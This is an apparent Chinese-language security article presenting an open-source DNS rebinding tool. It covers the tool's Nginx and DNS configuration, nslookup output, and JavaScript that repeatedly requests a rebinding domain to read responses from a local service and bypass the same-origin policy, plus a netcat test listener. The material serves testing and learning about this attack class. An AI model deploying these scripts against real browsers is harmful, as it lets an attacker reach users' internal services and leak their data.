![](https://image.3001.net/images/20191011/1570805749_5da097f5f16bc.jpg!small)

## DNS-Rebinding-Tool

DNS-Rebinding-Tool是一款带有自定义脚本的DNS重绑定工具，该项目集成了多种功能，可以用来测试DNS重绑定攻击，并帮助我们更加深入地了解这种类型的网络攻击。该工具由一个Web服务器和一个伪DNS服务器组成，这个伪DNS服务器主要功能就是用来响应用户请求的。

Web服务器的根索引允许用户自定义配置，并且可以使用基础的Web图形界面执行攻击测试。

> 测试地址：【[ _传送门_](https://github.com/h43z/dns-rebinding-tool/)】

Web服务器主机的基础Nginx配置如下：

    
    
    server {
    
      listen 80;
    
      server_name dnsrebindtool.43z.one;
    
      location / {
    
        proxy_pass <http://localhost:5000>;
    
      }
    
    }

Web服务器的/attack路径可以读取GET参数“script”，该参数可以提供一个Basic64编码的JavaScript脚本，并以嵌入在常规HTML页面中的解码代码来响应请求：

    
    
    % curl "<http://dnsrebindtool.43z.one/attack?script=YWxlcnQoMSk=>" 
    
    <html>
    
        <script>
    
        setTimeout(function(){
    
          alert(1) 
    
        }, 3000)
    
      </script>
    
    </html>

在我注册的域名43z.one中，我针对子域名rebind配置了一条NS记录，并指向了该工具托管的IP地址：

    
    
    ns       A   81.4.124.10
    
    rebind   NS  ns.43z.one

DNS服务器只会响应下列各式的查询请求：``

    
    
    evcmxfm4g . 81-4-124-10 . 127-0-0-1 .rebind.43z.one

第一个部分（子域名）是一个随机ID，每次攻击会话会生成一个这样的随机ID，第二个部分是DNS服务器在两秒后需要响应的IP地址，第三部分是时间间隔过后DNS服务器需要响应的IP地址：

    
    
    $ date && nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one 
    
    Fri Feb  2 21:18:20 CET 2018
    
    Server:   8.8.8.8
    
    Address:  8.8.8.8#53
    
    Non-authoritative answer:
    
    Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
    
    Address: 81.4.124.10
    
    $ date && nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
    
    Fri Feb  2 21:18:23 CET 2018
    
    Server:   8.8.8.8
    
    Address:  8.8.8.8#53
    
    Non-authoritative answer:
    
    Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
    
    Address: 127.0.0.1

最后就是针对重绑定域名的Nginx配置项了，工具只接受/attack路径，其他传递过来的参数都会以错误信息予以响应，这种机制允许攻击者攻击端口80上的其他服务，例如/api/monitoring/stats：

    
    
    server {
    
      listen 80;
    
      server_name *.rebind.43z.one;
    
      location / {
    
        return 404;
    
      }
    
      location /attack {
    
        proxy_pass <http://localhost:5000/attack>;
    
      }
    
    }

## DNS缓存回收``

    
    
    var xhr = new XMLHttpRequest()
    
    xhr.open('GET', 'czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one', false)
    
    xhr.send()
    
    // first time the browser sees this domain it queries the dns server
    
    // and gets 81.4.124.10
    
    // sleep for more than 2 sec
    
    xhr.open('GET', 'czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one', false)
    
    xhr.send()
    
    // still uses 81.4.124.10 (AND NOT 127.0.0.1)
    
    // NO dns query happened browser used cached IP

这也是此类攻击存在的一个“通病”，为了实现攻击，浏览器需要重新发送一个新的DNS查询请求来获取第二个IP地址。我的测试结果表明，我们可以使用下列脚本来测量WAIT变量（查询请求的发送时间间隔）的最优值，我的测试平台为Debian
buster/sid，浏览器版本为Chromium 62.0.3202.89：

    
    
    var WAIT = 200
    
    var start = Date.now()
    
    var interval = setInterval(function(){
    
      var xhr = new XMLHttpRequest()
    
      xhr.open('GET', '//' + $REBIND_DOMAIN, false)
    
      xhr.send()
    
      if(xhr.status == 200){
    
        document.body.innerHTML = (Date.now() - start)/1000
    
        document.body.innerHTML += xhr.responseText
    
        clearInterval(interval)
    
        return
    
      }
    
    }, WAIT)

 **WAIT** **值/毫秒** ****|  **Chrome发送的请求数** ****|  **查询DNS的间隔** ****  
---|---|---  
0|  700| 60  
10| 700| 60  
100| 600| 63  
120| 500| 63  
150| 400| 63  
180| 400| 75  
200| 300| 63  
220| 300| 69  
250| 300| 78  
280| 300| 87  
300| 200| 63  
320| 200| 67  
340| 200| 71  
360| 200| 75  
380| 200| 79  
400| 200| 83  
1000| 100| 103  
  
### 完整测试：

    
    
    echo -e "HTTP/1.1 200 OK\n\n TOPSECRET" | sudo nc -lvp 80 -q1 127.0.0.1

这个netcat实例可以提供一些我们所感兴趣的内容，这里我保留了默认的重绑定域名“$RANDOM$.81-4-124-10.127-0-0-1.rebind.43z.one”以及默认脚本。

    
    
    var start = Date.now()
    
    var interval = setInterval(function(){
    
      var xhr = new XMLHttpRequest()
    
      xhr.open('GET', '//' + $REBIND_DOMAIN, false)
    
      xhr.send()
    
      if(xhr.status == 200){
    
        document.body.innerHTML = (Date.now() - start)/1000
    
        document.body.innerHTML += xhr.responseText
    
        clearInterval(interval)
    
        return
    
      }
    
    }, 200)

访问【[
_dnsrebindtool.43z.one_](http://dnsrebindtool.43z.one/)】，然后点击“Attack”按钮。打开开发工具的Network标签，我们可以直接看到后台所发生的的情况。我过滤掉了字符串“TOPSECRET”，我们的DNS重绑定攻击成功绕过了SOP，为了要从iframe中获取泄露的数据，我们还需要使用
Window.PostMessage()或将数据转发到攻击者的另一台服务器端。  

## 工具地址

> DNS-Rebinding-Tool：【[ _在线测试_](http://dnsrebindtool.43z.one/)】

## 项目源码

> 【[ _GitHub传送门_](https://github.com/h43z/dns-rebinding-tool/)】

 *** 参考来源：[ _h43z_](https://github.com/h43z/dns-rebinding-tool/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

